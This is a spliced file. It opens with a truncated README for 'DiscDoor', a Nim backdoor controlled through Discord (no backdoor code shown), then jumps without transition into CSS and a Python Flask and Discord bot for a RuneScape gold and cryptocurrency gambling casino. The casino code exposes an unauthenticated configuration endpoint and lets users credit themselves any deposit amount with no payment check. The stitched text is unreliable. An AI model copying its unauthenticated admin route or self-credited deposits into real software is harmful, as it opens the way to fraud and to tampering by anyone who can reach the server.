    <img src="https://img.shields.io/badge/version-v0.0.1-2C3333" alt=""/>
</div>

<br>

DiscDoor is a tool written in [Nim](https://nim-lang.org/), an awesome language. By leveraging a Discord server for communication with the target's computer, it enable>

<div align="center">
    <img src="images/cowsay.png" alt="Description of the image"/>
</div>

>[!WARNING]
>This tool is designed for educational and ethical hacking purposes only. Unauthorized use of this tool on systems or networks without explicit permission is illegal a>

- [DiscDoor](#DiscDoor)
    - [What it does](#What-it-does)
        - [See it in action](#See-it-in-action)
    - [Why](#Why)
- [Installation](#Installation)
    - [Bot setup](https://github.com/rdWei/DiscDoor/blob/main/docs/BOTSETUP.md)
    - [Linux](#Linux)
    - [Windows](#Windows)
- [Quick Start](#Quick-Start)
    - [Install backdoor on Linux machine](#Install-backdoor-on-Linux-machine)




        .btn:hover {
            background: #9932CC;
            transform: translateY(-3px);
            box-shadow: 0 6px 15px rgba(138, 43, 226, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .payout-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 15px;
        }

        .payout-item {
            display: flex;
            flex-direction: column;
            background: rgba(0, 0, 0, 0.25);
            padding: 15px;
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .payout-item:hover {
            background: rgba(0, 0, 0, 0.4);
            transform: translateY(-3px);
        }

        .payout-item strong {
            font-size: 1.3rem;
            margin-bottom: 10px;
            text-align: center;
        }

        .exchange-rates {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 18px;
        }

        .exchange-card {
            background: rgba(0, 0, 0, 0.25);
            border-radius: 10px;
            padding: 18px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
            transition: all 0.3s ease;
        }

        .exchange-card:hover {
            background: rgba(0, 0, 0, 0.35);
            transform: translateY(-3px);
        }

        .exchange-card h3 {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            color: var(--accent);
            font-size: 1.3rem;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 18px 28px;
            border-radius: 10px;
            background: var(--success);
            color: white;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
            transform: translateX(200%);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 1000;
            font-weight: 600;
            font-size: 1.1rem;
        }

        .notification.show {
            transform: translateX(0);
        }

        .chart-container {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 20px;
            margin-top: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
        }

        .chart-title {
            color: var(--accent);
            margin-bottom: 20px;
            font-size: 1.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 2px solid var(--accent);
            padding-bottom: 10px;
        }

        .chart-wrapper {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .save-section {
            background: var(--card-bg);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            margin-top: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
        }

        .btn-lg {
            padding: 15px 35px;
            font-size: 1.2rem;
        }

        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 20px;
            }

            .server-stats {
                width: 100%;
                justify-content: space-around;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-content">
            <div class="logo">
                <i class="fas fa-crown logo-icon"></i>
                <h1>DegensDen Casino Management</h1>
            </div>
            <div class="server-stats">
                <div class="stat-item">
                    <div class="stat-value">{{ stats.total_players }}</div>
                    <div class="stat-label">Players</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{{ stats.total_balance|format_gp }}</div>
                    <div class="stat-label">Total Balance</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{{ stats.house_profit|format_gp }}</div>
                    <div class="stat-label">House Profit</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{{ stats.daily_players }}</div>
                    <div class="stat-label">Active Today</div>
                </div>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="dashboard-grid">
            <!-- General Settings -->
            <div class="card">
                <h2><i class="fas fa-cog"></i> Core Settings</h2>
                <div class="form-group">
                    <label for="currency_name">Currency Name</label>
                    <input type="text" id="currency_name" value="{{ config.currency_name }}">
                </div>
                <div class="form-group">
                    <label for="daily_bonus">Daily Bonus</label>
                    <input type="number" id="daily_bonus" value="{{ config.daily_bonus }}">
                </div>
                <div class="form-group">
                    <label for="min_withdrawal">Minimum Withdrawal</label>
                    <input type="number" id="min_withdrawal" value="{{ config.min_withdrawal }}">
                </div>
                <div class="form-group">
                    <label for="house_edge">House Edge (%)</label>
                    <input type="number" step="0.01" id="house_edge" value="{{ config.house_edge }}">
                </div>
                <div class="form-group">
                    <label for="osrs_webhook">OSRS Webhook URL</label>
                    <input type="text" id="osrs_webhook" value="{{ config.osrs_webhook }}">
                </div>
            </div>

            <!-- Betting & Economy -->
            <div class="card">
                <h2><i class="fas fa-coins"></i> Economy Settings</h2>
                <div class="form-group">
                    <label for="min_bet">Minimum Bet</label>
                    <input type="number" id="min_bet" value="{{ config.min_bet }}">
                </div>
                <div class="form-group">
                    <label for="max_bet">Maximum Bet</label>
                    <input type="number" id="max_bet" value="{{ config.max_bet }}">
                </div>
                <div class="form-group">
                    <label for="dice_payout">Dice Payout Multiplier</label>
                    <input type="number" step="0.01" id="dice_payout" value="{{ config.dice_payout }}">
                </div>
                <div class="form-group">
                    <label for="jackpot_pool">Jackpot Pool (%)</label>
                    <input type="number" step="0.1" id="jackpot_pool" value="{{ config.jackpot_pool }}">
                </div>
            </div>

            <!-- Slot Machine -->
            <div class="card">
                <h2><i class="fas fa-sliders-h"></i> Slot Machine</h2>
                <div class="payout-grid">
                    {% for combo, multiplier in config.slot_payouts.items() %}
                    <div class="payout-item">
                        <strong>{{ combo }}</strong>
                        <input type="number" class="payout-value" data-combo="{{ combo }}" value="{{ multiplier }}">
                    </div>
                    {% endfor %}
                </div>
            </div>

            <!-- Exchange Rates -->
            <div class="card">
                <h2><i class="fas fa-chart-line"></i> Economy Rates</h2>
                <div class="exchange-rates">
                    {% for currency, rate in config.exchange_rates.items() %}
                    <div class="exchange-card">
                        <h3><i class="fas fa-money-bill-wave"></i> {{ currency|upper }}</h3>
                        <div class="form-group">
                            <label>1 {{ currency|upper }} =</label>
                            <input type="number" step="0.000001" class="exchange-rate" data-currency="{{ currency }}" value="{{ rate }}">
                        </div>
                    </div>
                    {% endfor %}
                </div>
            </div>
        </div>

        <!-- Charts Section -->
        <div class="chart-container">
            <h2 class="chart-title"><i class="fas fa-chart-bar"></i> Activity Analytics</h2>
            <div class="chart-wrapper">
                <img src="data:image/png;base64,{{ activity_chart }}" alt="Activity Chart" style="max-width: 100%;">
            </div>
        </div>

        <!-- Save Section -->
        <div class="save-section">
            <button id="save-settings" class="btn btn-lg">
                <i class="fas fa-save"></i> SAVE ALL SETTINGS
            </button>
        </div>
    </div>

    <div class="notification" id="notification">
        Settings saved successfully!
    </div>

    <script>
        document.getElementById('save-settings').addEventListener('click', async () => {
            const settings = {
                currency_name: document.getElementById('currency_name').value,
                daily_bonus: document.getElementById('daily_bonus').value,
                min_withdrawal: document.getElementById('min_withdrawal').value,
                house_edge: document.getElementById('house_edge').value,
                osrs_webhook: document.getElementById('osrs_webhook').value,
                min_bet: document.getElementById('min_bet').value,
                max_bet: document.getElementById('max_bet').value,
                dice_payout: document.getElementById('dice_payout').value,
                jackpot_pool: document.getElementById('jackpot_pool').value,
                slot_payouts: {},
                exchange_rates: {}
            };

            // Get slot payouts
            document.querySelectorAll('.payout-value').forEach(input => {
                const combo = input.dataset.combo;
                settings.slot_payouts[combo] = input.value;
            });

            // Get exchange rates
            document.querySelectorAll('.exchange-rate').forEach(input => {
                const currency = input.dataset.currency;
                settings.exchange_rates[currency] = input.value;
            });

            try {
                const response = await fetch('/update_config', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(settings)
                });

                if (response.ok) {
                    showNotification('Settings saved successfully!');
                    // Reload page to update stats and charts
                    setTimeout(() => location.reload(), 1500);
                } else {
                    showNotification('Error saving settings!', 'error');
                }
            } catch (error) {
                showNotification('Network error!', 'error');
                console.error('Error:', error);
            }
        });

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = 'notification show';

            if (type === 'error') {
                notification.style.background = '#E74C3C';
            } else {
                notification.style.background = '#2ECC71';
            }

            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
    </script>
</body>
</html>'''

# Create templates directory if not exists
if not os.path.exists('templates'):
    os.makedirs('templates')

# Write HTML template to file
with open('templates/dashboard.html', 'w', encoding='utf-8') as f:
    f.write(HTML_TEMPLATE)

# ------------------------
# Database Setup
# ------------------------
def init_db():
    conn = sqlite3.connect('casino.db')
    c = conn.cursor()

    # Create tables
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        balance INTEGER DEFAULT 0,
        deposits INTEGER DEFAULT 0,
        withdrawals INTEGER DEFAULT 0,
        last_daily TEXT,
        last_active TEXT,
        wins INTEGER DEFAULT 0,
        losses INTEGER DEFAULT 0,
        profit INTEGER DEFAULT 0,
        total_wagered INTEGER DEFAULT 0
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS rsns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        rsn TEXT UNIQUE,
        verified BOOLEAN DEFAULT 0,
        verification_code TEXT,
        FOREIGN KEY(user_id) REFERENCES users(user_id)
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        method TEXT,
        address TEXT,
        amount REAL,
        type TEXT,
        status TEXT DEFAULT 'pending',
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS config (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS activity_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT,
        event_data TEXT,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS jackpot (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER DEFAULT 0
    )''')

    # Insert default config if not exists
    default_config = [
        ('currency_name', 'GP'),
        ('house_edge', '0.05'),
        ('min_bet', '1000'),
        ('max_bet', '10000000'),
        ('daily_bonus', '25000'),
        ('dice_payout', '1.95'),
        ('min_withdrawal', '10000'),
        ('jackpot_pool', '0.01'),  # 1% of bets go to jackpot
        ('slot_payouts', json.dumps({
            "🍇🍇🍇": 2, "🍊🍊🍊": 2, "🍋🍋🍋": 2, "🍉🍉🍉": 3,
            "🔔🔔🔔": 5, "💰💰💰": 10, "👑👑👑": 15, "💎💎💎": 25,
            "🍒🍒🍒": 3, "⭐⭐⭐": 50, "🍀🍀🍀": 100, "🎯🎯🎯": 250,
            "🐉🐉🐉": 500, "👹👹👹": 1000, "🦄🦄🦄": 2000
        })),
        ('exchange_rates', json.dumps({
            "gold": 1.0, "btc": 0.000025, "eth": 0.0004,
            "ltc": 0.0025, "cashapp": 1.0
        })),
        ('osrs_webhook', ''),
        ('dashboard_url', '')
    ]

    c.executemany('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)', default_config)

    # Initialize jackpot
    c.execute("INSERT OR IGNORE INTO jackpot (id, amount) VALUES (1, 0)")

    conn.commit()
    conn.close()

init_db()

# ------------------------
# Database Functions
# ------------------------
def get_db_connection():
    conn = sqlite3.connect('casino.db')
    conn.row_factory = sqlite3.Row
    return conn

def get_config_value(key, default=None):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key = ?", (key,))
    result = c.fetchone()
    conn.close()
    return result['value'] if result else default

def set_config_value(key, value):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def log_activity(event_type, event_data):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO activity_log (event_type, event_data) VALUES (?, ?)",
              (event_type, json.dumps(event_data)))
    conn.commit()
    conn.close()

def get_jackpot_amount():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT amount FROM jackpot WHERE id = 1")
    result = c.fetchone()
    conn.close()
    return result['amount'] if result else 0

def add_to_jackpot(amount):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE jackpot SET amount = amount + ? WHERE id = 1", (amount,))
    conn.commit()
    conn.close()

# ------------------------
# Flask GUI Enhancements
# ------------------------
def generate_activity_chart():
    conn = get_db_connection()
    c = conn.cursor()

    # Get last 7 days activity
    c.execute('''SELECT
                 DATE(timestamp) AS date,
                 COUNT(*) AS activity_count
                 FROM activity_log
                 WHERE timestamp >= DATE('now', '-7 days')
                 GROUP BY DATE(timestamp)
                 ORDER BY DATE(timestamp)''')
    results = c.fetchall()

    dates = []
    counts = []

    # Fill in missing days
    today = datetime.now().date()
    for i in range(7):
        date = today - timedelta(days=6-i)
        date_str = date.strftime("%Y-%m-%d")
        dates.append(date.strftime("%a %m/%d"))

        # Find count for this date
        count = 0
        for row in results:
            if row['date'] == date_str:
                count = row['activity_count']
                break
        counts.append(count)

    conn.close()

    # Create chart
    plt.figure(figsize=(10, 5))
    plt.bar(dates, counts, color='#8A2BE2', edgecolor='black')
    plt.title('7-Day Activity Trend', fontsize=14, fontweight='bold')
    plt.xlabel('Date', fontsize=12)
    plt.ylabel('Activity Count', fontsize=12)
    plt.grid(axis='y', alpha=0.3)
    plt.tight_layout()

    # Save to bytes
    buf = io.BytesIO()
    plt.savefig(buf, format='png')
    buf.seek(0)
    plt.close()

    return base64.b64encode(buf.read()).decode('utf-8')

@app.template_filter('format_gp')
def format_gp(value):
    value = int(value)
    if value >= 1000000:
        return f"{value/1000000:.2f}M {get_config_value('currency_name')}"
    elif value >= 1000:
        return f"{value/1000:.1f}K {get_config_value('currency_name')}"
    return f"{value} {get_config_value('currency_name')}"

@app.route('/')
def dashboard():
    conn = get_db_connection()
    c = conn.cursor()

    # Get stats
    c.execute("SELECT COUNT(*) FROM users")
    total_players = c.fetchone()[0]

    c.execute("SELECT SUM(balance) FROM users")
    total_balance = c.fetchone()[0] or 0

    c.execute("SELECT SUM(profit) FROM users")
    house_profit = c.fetchone()[0] or 0

    c.execute("SELECT COUNT(*) FROM users WHERE last_active >= DATE('now')")
    daily_players = c.fetchone()[0]

    # Get jackpot
    jackpot = get_jackpot_amount()

    # Get config
    config_values = {
        'currency_name': get_config_value('currency_name'),
        'house_edge': get_config_value('house_edge'),
        'min_bet': get_config_value('min_bet'),
        'max_bet': get_config_value('max_bet'),
        'daily_bonus': get_config_value('daily_bonus'),
        'dice_payout': get_config_value('dice_payout'),
        'min_withdrawal': get_config_value('min_withdrawal'),
        'slot_payouts': json.loads(get_config_value('slot_payouts')),
        'exchange_rates': json.loads(get_config_value('exchange_rates')),
        'osrs_webhook': get_config_value('osrs_webhook'),
        'jackpot_pool': get_config_value('jackpot_pool'),
        'dashboard_url': get_config_value('dashboard_url')
    }

    # Generate chart
    activity_chart = generate_activity_chart()

    conn.close()

    return render_template('dashboard.html',
                           config=config_values,
                           stats={
                               'total_players': total_players,
                               'total_balance': total_balance,
                               'house_profit': house_profit,
                               'daily_players': daily_players,
                               'jackpot': jackpot
                           },
                           activity_chart=activity_chart)

@app.route('/update_config', methods=['POST'])
def update_config():
    data = request.json
    for key, value in data.items():
        if key in ['slot_payouts', 'exchange_rates']:
            value = json.dumps(value)
        set_config_value(key, value)

    # Log config change
    log_activity('config_update', {
        'changed_keys': list(data.keys()),
        'timestamp': datetime.utcnow().isoformat()
    })

    return jsonify({"status": "success"})

def run_flask():
    from waitress import serve
    print("Starting production WSGI server...")
    serve(app, host='192.168.95.167', port=5000)

# Start Flask in a separate thread
threading.Thread(target=run_flask, daemon=True).start()

# ------------------------
# Bot Utilities
# ------------------------
def create_embed(title, description, color=0x00FF00, user=None, amount=None, game=None):
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "timestamp": datetime.utcnow().isoformat(),
        "footer": {
            "text": "DegensDen Casino • Provably Fair Gaming"
        },
        "thumbnail": {"url": GOATGANG_IMAGE_URL}  # GOATGANG thumbnail
    }

    if user:
        embed["author"] = {
            "name": f"{user.name}#{user.discriminator}",
            "icon_url": user.display_avatar.url
        }

    fields = []
    if amount is not None:
        prefix = "+" if color == 0x00FF00 else ""
        fields.append({
            "name": "Amount",
            "value": f"{prefix}{amount:,} {get_config_value('currency_name')}",
            "inline": True
        })
    if game:
        fields.append({
            "name": "Game",
            "value": game,
            "inline": True
        })

    if fields:
        embed["fields"] = fields

    return embed

def send_webhook(embed_data):
    payload = {
        "embeds": [embed_data],
        "username": "Casino Manager",
        "avatar_url": GOATGANG_IMAGE_URL  # GOATGANG as avatar
    }
    try:
        requests.post(CASINO_WEBHOOK, json=payload)
    except Exception as e:
        print(f"Webhook error: {e}")

def format_gp(amount):
    amount = int(amount)
    if amount >= 1000000:
        return f"{amount/1000000:.2f}M"
    elif amount >= 1000:
        return f"{amount/1000:.1f}K"
    return f"{amount}"

# ------------------------
# Verification System
# ------------------------
@bot.command(name='link', aliases=['verify'])
async def link_rsn(ctx, rsn: str = None):
    if rsn is None:
        await ctx.send("❌ Please provide your RuneScape name. Example: `!link YourRSN`")
        return

    conn = get_db_connection()
    c = conn.cursor()

    # Check if user exists
    c.execute("SELECT * FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user:
        c.execute("INSERT INTO users (user_id, balance) VALUES (?, ?)", (str(ctx.author.id), 0))
        conn.commit()

    # Generate verification code
    code = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ23456789', k=6))

    try:
        # Insert or update RSN
        c.execute('''INSERT OR REPLACE INTO rsns (user_id, rsn, verified, verification_code)
                     VALUES (?, ?, 0, ?)''',
                  (str(ctx.author.id), rsn, code))
        conn.commit()
    except sqlite3.IntegrityError:
        await ctx.send(f"❌ RSN `{rsn}` is already linked to another account!")
        conn.close()
        return

    conn.close()

    # Send instructions
    embed = discord.Embed(
        title="🔗 Account Linking",
        description=f"To verify your RSN `{rsn}`, please follow these steps:",
        color=0x3498DB
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    embed.add_field(
        name="Step 1",
        value=f"Add `{code}` to your RuneScape account's private chat status",
        inline=False
    )
    embed.add_field(
        name="Step 2",
        value=f"Take a screenshot showing both your character and the status",
        inline=False
    )
    embed.add_field(
        name="Step 3",
        value="Send the screenshot to a staff member for verification",
        inline=False
    )
    embed.set_footer(text="Verification usually takes 1-24 hours")
    await ctx.send(embed=embed)

# ------------------------
# Payment System
# ------------------------
@bot.command(name='payment', aliases=['setpayment'])
async def set_payment_method(ctx, method: str, address: str):
    valid_methods = ["gold", "btc", "eth", "ltc", "cashapp"]
    method = method.lower()

    if method not in valid_methods:
        await ctx.send(f"❌ Invalid payment method! Valid methods: {', '.join(valid_methods)}")
        return

    conn = get_db_connection()
    c = conn.cursor()

    c.execute('''INSERT OR REPLACE INTO payments (user_id, method, address)
                 VALUES (?, ?, ?)''',
              (str(ctx.author.id), method, address))

    conn.commit()
    conn.close()

    embed = discord.Embed(
        title="💳 Payment Method Set",
        description=f"Your {method.upper()} address has been saved",
        color=0x3498DB
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    embed.add_field(name="Method", value=method.upper(), inline=True)
    embed.add_field(name="Address", value=f"`{address}`", inline=True)
    await ctx.send(embed=embed)

@bot.command(name='methods')
async def show_payment_methods(ctx):
    methods_embed = discord.Embed(
        title="💳 Payment Methods",
        description="Deposit and withdraw funds using these methods:",
        color=0x3498DB
    )
    methods_embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail

    methods_embed.add_field(
        name="Gold (GP)",
        value="Direct in-game currency transfers",
        inline=False
    )

    methods_embed.add_field(
        name="Bitcoin (BTC)",
        value="Cryptocurrency deposits and withdrawals",
        inline=False
    )

    methods_embed.add_field(
        name="Ethereum (ETH)",
        value="Cryptocurrency deposits and withdrawals",
        inline=False
    )

    methods_embed.add_field(
        name="Litecoin (LTC)",
        value="Cryptocurrency deposits and withdrawals",
        inline=False
    )

    methods_embed.add_field(
        name="CashApp",
        value="USD deposits and withdrawals",
        inline=False
    )

    methods_embed.set_footer(text="Set your payment address with !payment <method> <address>")
    await ctx.send(embed=methods_embed)

@bot.command(name='deposit')
async def deposit_funds(ctx, amount: float, method: str = "gold"):
    exchange_rates = json.loads(get_config_value('exchange_rates'))
    method = method.lower()

    if method not in exchange_rates:
        await ctx.send(f"❌ Invalid payment method! Valid methods: {', '.join(exchange_rates.keys())}")
        return

    converted_amount = int(amount * float(exchange_rates[method]))

    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT * FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user:
        c.execute("INSERT INTO users (user_id, balance) VALUES (?, ?)", (str(ctx.author.id), 0))

    c.execute('''UPDATE users SET
                 balance = balance + ?,
                 deposits = deposits + ?
                 WHERE user_id = ?''',
              (converted_amount, converted_amount, str(ctx.author.id)))

    c.execute('''INSERT INTO payments (user_id, method, address, amount, type)
                 VALUES (?, ?, ?, ?, ?)''',
              (str(ctx.author.id), method, "DEPOSIT", amount, "deposit"))

    conn.commit()
    conn.close()

    embed = discord.Embed(
        title="💳 Deposit Successful",
        description=f"Added {converted_amount:,} {get_config_value('currency_name')} to your balance",
        color=0x00FF00
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    embed.add_field(name="Amount", value=f"{amount} {method.upper()}", inline=True)
    embed.add_field(name="Converted", value=f"{converted_amount:,} {get_config_value('currency_name')}", inline=True)
    await ctx.send(embed=embed)

    webhook_embed = create_embed(
        "Deposit Processed",
        f"{ctx.author.mention} deposited funds via {method.upper()}",
        color=0x00FF00,
        user=ctx.author,
        amount=converted_amount
    )
    send_webhook(webhook_embed)

    # Log activity
    log_activity('deposit', {
        'user_id': str(ctx.author.id),
        'amount': converted_amount,
        'method': method
    })

@bot.command(name='withdraw')
async def withdraw_funds(ctx, amount: int, method: str = "gold"):
    min_withdrawal = int(get_config_value('min_withdrawal'))

    if amount < min_withdrawal:
        await ctx.send(f"❌ Minimum withdrawal is {min_withdrawal:,} {get_config_value('currency_name')}")
        return

    exchange_rates = json.loads(get_config_value('exchange_rates'))
    method = method.lower()

    if method not in exchange_rates:
        await ctx.send(f"❌ Invalid payment method! Valid methods: {', '.join(exchange_rates.keys())}")
        return

    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user or user['balance'] < amount:
        await ctx.send(f"❌ Insufficient funds! Your balance: {user['balance'] if user else 0:,} {get_config_value('currency_name')}")
        conn.close()
        return

    c.execute("SELECT address FROM payments WHERE user_id = ? AND method = ?",
              (str(ctx.author.id), method))
    payment = c.fetchone()

    if not payment:
        await ctx.send(f"❌ No {method.upper()} address set! Use `!payment {method} <your_address>`")
        conn.close()
        return

    converted_amount = amount / float(exchange_rates[method])

    c.execute('''UPDATE users SET
                 balance = balance - ?,
                 withdrawals = withdrawals + ?
                 WHERE user_id = ?''',
              (amount, amount, str(ctx.author.id)))

    c.execute('''INSERT INTO payments (user_id, method, address, amount, type)
                 VALUES (?, ?, ?, ?, ?)''',
              (str(ctx.author.id), method, payment['address'], amount, "withdrawal"))

    conn.commit()
    payment_id = c.lastrowid
    conn.close()

    embed = discord.Embed(
        title="💸 Withdrawal Requested",
        description=f"Withdrawal of {amount:,} {get_config_value('currency_name')} has been queued",
        color=0x00FF00
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    embed.add_field(name="Method", value=method.upper(), inline=True)
    embed.add_field(name="Amount", value=f"{converted_amount:.8f} {method.upper()}", inline=True)
    embed.add_field(name="Address", value=f"`{payment['address']}`", inline=False)
    embed.add_field(name="Payment ID", value=f"`#{payment_id}`", inline=False)
    embed.add_field(name="Processing", value="Please allow 1-24 hours for processing", inline=False)
    await ctx.send(embed=embed)

    webhook_embed = create_embed(
        "Withdrawal Requested",
        f"{ctx.author.mention} requested withdrawal via {method.upper()}",
        color=0x00FF00,
        user=ctx.author,
        amount=-amount
    )
    send_webhook(webhook_embed)

    # Log activity
    log_activity('withdrawal', {
        'user_id': str(ctx.author.id),
        'amount': amount,
        'method': method
    })

# ------------------------
# Admin Commands
# ------------------------
@bot.command(name='verifyrsn')
@commands.has_role(ADMIN_ROLE_ID)
async def admin_verify_rsn(ctx, rsn: str):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("UPDATE rsns SET verified = 1 WHERE rsn = ?", (rsn,))

    if c.rowcount == 0:
        await ctx.send(f"❌ RSN `{rsn}` not found in the database!")
        conn.close()
        return

    conn.commit()

    c.execute("SELECT user_id FROM rsns WHERE rsn = ?", (rsn,))
    result = c.fetchone()
    if not result:
        await ctx.send(f"❌ User not found for RSN `{rsn}`!")
        conn.close()
        return

    user_id = result['user_id']
    user = await bot.fetch_user(int(user_id))

    conn.close()

    embed = discord.Embed(
        title="✅ RSN Verified",
        description=f"RSN `{rsn}` has been verified for {user.mention}",
        color=0x00FF00
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    await ctx.send(embed=embed)

    try:
        await user.send(f"🎉 Your RSN `{rsn}` has been verified by our staff!")
    except discord.Forbidden:
        pass

@bot.command(name='processwithdrawal')
@commands.has_role(ADMIN_ROLE_ID)
async def process_withdrawal(ctx, payment_id: int):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT * FROM payments WHERE id = ?", (payment_id,))
    payment = c.fetchone()

    if not payment:
        await ctx.send(f"❌ Payment ID `#{payment_id}` not found!")
        conn.close()
        return

    if payment['status'] == 'completed':
        await ctx.send(f"⚠️ Payment `#{payment_id}` is already completed")
        conn.close()
        return

    c.execute("UPDATE payments SET status = 'completed' WHERE id = ?", (payment_id,))
    conn.commit()
    conn.close()

    embed = discord.Embed(
        title="✅ Withdrawal Processed",
        description=f"Payment `#{payment_id}` has been completed",
        color=0x00FF00
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    await ctx.send(embed=embed)

    # Log activity
    log_activity('withdrawal_processed', {
        'payment_id': payment_id,
        'admin_id': str(ctx.author.id)
    })

@bot.command(name='addgp')
@commands.has_role(ADMIN_ROLE_ID)
async def add_gp(ctx, member: discord.Member, amount: int):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT * FROM users WHERE user_id = ?", (str(member.id),))
    user = c.fetchone()

    if not user:
        c.execute("INSERT INTO users (user_id, balance) VALUES (?, ?)", (str(member.id), 0))

    c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, str(member.id)))

    conn.commit()
    conn.close()

    embed = discord.Embed(
        title="⚡ Admin Action",
        description=f"Added {amount:,} {get_config_value('currency_name')} to {member.mention}",
        color=0x9B59B6
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    await ctx.send(embed=embed)

    webhook_embed = create_embed(
        "Admin Action - Funds Added",
        f"Admin {ctx.author.mention} added funds to {member.mention}",
        color=0x9B59B6,
        user=member,
        amount=amount
    )
    send_webhook(webhook_embed)

# ------------------------
# Casino Commands
# ------------------------
@bot.command(name='daily')
async def daily_bonus(ctx):
    daily_amount = int(get_config_value('daily_bonus'))

    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT * FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user:
        await ctx.send("❌ You need to link an RSN first with `!link <RSN>`")
        conn.close()
        return

    if user['last_daily']:
        last_claim = datetime.fromisoformat(user['last_daily'])
        if (datetime.utcnow() - last_claim).days < 1:
            time_left = 24 - (datetime.utcnow() - last_claim).seconds // 3600
            await ctx.send(f"⏳ You've already claimed your daily bonus today! Come back in {time_left} hours.")
            conn.close()
            return

    c.execute('''UPDATE users SET
                 balance = balance + ?,
                 last_daily = ?,
                 last_active = ?
                 WHERE user_id = ?''',
              (daily_amount, datetime.utcnow().isoformat(), datetime.utcnow().isoformat(), str(ctx.author.id)))

    conn.commit()
    conn.close()

    response = discord.Embed(
        title="🎁 Daily Bonus Claimed!",
        description=f"{ctx.author.mention} has received their daily bonus",
        color=0x00FF00
    )
    response.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    response.add_field(name="Amount", value=f"{daily_amount:,} {get_config_value('currency_name')}", inline=True)
    await ctx.send(embed=response)

    webhook_embed = create_embed(
        "Daily Bonus Claimed",
        f"{ctx.author.mention} claimed their daily bonus",
        color=0x00FF00,
        user=ctx.author,
        amount=daily_amount
    )
    send_webhook(webhook_embed)

    # Log activity
    log_activity('daily_bonus', {
        'user_id': str(ctx.author.id),
        'amount': daily_amount
    })

@bot.command(name='balance', aliases=['bal'])
async def balance(ctx):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT * FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user:
        await ctx.send("❌ You need to register first with `!link <RSN>`")
        conn.close()
        return

    c.execute("SELECT rsn, verified FROM rsns WHERE user_id = ?", (str(ctx.author.id),))
    rsns = c.fetchall()

    # Get jackpot amount
